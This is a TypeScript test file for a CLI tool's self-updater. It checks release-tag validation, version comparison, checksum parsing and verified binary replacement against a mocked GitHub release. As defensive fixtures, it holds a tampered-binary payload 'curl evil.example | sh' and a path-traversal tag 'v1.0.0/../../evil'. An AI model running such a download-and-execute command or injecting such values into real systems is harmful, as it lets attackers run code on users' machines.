import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
import { mkdtemp, rm, stat } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { RELEASES, releaseAsset } from "./constants.ts";
import { downloadVerified, isNewer, latestRelease, parseChecksums, replaceBinary, sha256 } from "./core/update.ts";

// A fake GitHub release served from memory, so update logic runs end to end without the network.
const ASSET = releaseAsset("linux", "x64");
const NEW_BINARY = new TextEncoder().encode("#!/bin/sh\necho 9.9.9\n");
let assets: Record<string, Uint8Array<ArrayBuffer> | string>;
let tag: string;
let dir: string;

beforeEach(async () => {
  tag = "v9.9.9";
  assets = {
    [ASSET]: NEW_BINARY,
    [RELEASES.checksums]: `${sha256(NEW_BINARY)}  ${ASSET}\n${"0".repeat(64)}  ${releaseAsset("darwin", "arm64")}\n`,
  };
  dir = await mkdtemp(path.join(os.tmpdir(), "sikrets-update-"));
  spyOn(globalThis, "fetch").mockImplementation((async (input: string | URL | Request) => {
    const url = String(input);
    if (url === RELEASES.latest) return new Response(JSON.stringify({ tag_name: tag }));
    const prefix = `${RELEASES.download}/${tag}/`;
    const body = url.startsWith(prefix) ? assets[url.slice(prefix.length)] : undefined;
    return body === undefined ? new Response("Not Found", { status: 404 }) : new Response(body);
  }) as typeof fetch);
});

afterEach(() => rm(dir, { recursive: true, force: true }));

describe("update", () => {
  test("reads the latest tag and refuses odd ones", async () => {
    expect(await latestRelease()).toEqual({ tag: "v9.9.9", version: "9.9.9" });
    tag = "v1.0.0/../../evil";
    await expect(latestRelease()).rejects.toThrow("Unexpected release tag");
  });

  test("compares versions", () => {
    expect(isNewer("0.1.0", "0.0.9")).toBe(true);
    expect(isNewer("0.10.0", "0.9.0")).toBe(true);
    expect(isNewer("1.0.0", "1.0.0")).toBe(false);
    expect(isNewer("1.0.0", "1.0.0-rc.1")).toBe(true);
    expect(isNewer("1.0.0-rc.1", "1.0.0")).toBe(false);
    expect(isNewer("0.0.1", "0.1.0")).toBe(false);
  });

  test("parses sha256sum output, including binary-mode stars", () => {
    const sums = parseChecksums(`${"a".repeat(64)}  sikrets-linux-x64\n${"B".repeat(64)} *sikrets-windows-x64.exe\n\njunk line\n`);
    expect(sums.get("sikrets-linux-x64")).toBe("a".repeat(64));
    expect(sums.get("sikrets-windows-x64.exe")).toBe("b".repeat(64));
    expect(sums.size).toBe(2);
  });

  test("a verified download replaces the binary in place", async () => {
    const target = path.join(dir, "sikrets");
    await Bun.write(target, "old binary");
    await replaceBinary(target, await downloadVerified(tag, ASSET));
    expect(new Uint8Array(await Bun.file(target).arrayBuffer())).toEqual(NEW_BINARY);
    expect((await stat(target)).mode & 0o777).toBe(0o755);
    expect(await Bun.file(`${target}.new`).exists()).toBe(false);
  });

  test("a tampered binary is rejected and nothing is replaced", async () => {
    assets[ASSET] = new TextEncoder().encode("#!/bin/sh\ncurl evil.example | sh\n");
    await expect(downloadVerified(tag, ASSET)).rejects.toThrow("Checksum mismatch");
  });

  test("a platform missing from SHA256SUMS is rejected", async () => {
    await expect(downloadVerified(tag, releaseAsset("linux", "arm64"))).rejects.toThrow("has no sikrets-linux-arm64");
  });

  test("Windows moves the running exe aside first", async () => {
    const target = path.join(dir, "sikrets.exe");
    await Bun.write(target, "old binary");
    await replaceBinary(target, NEW_BINARY, "win32");
    expect(await Bun.file(target).text()).toBe(new TextDecoder().decode(NEW_BINARY));
    expect(await Bun.file(`${target}.old`).text()).toBe("old binary");
  });

  test("asset names match the release workflow", () => {
    expect(releaseAsset("darwin", "arm64")).toBe("sikrets-darwin-arm64");
    expect(releaseAsset("win32", "x64")).toBe("sikrets-windows-x64.exe");
  });
});
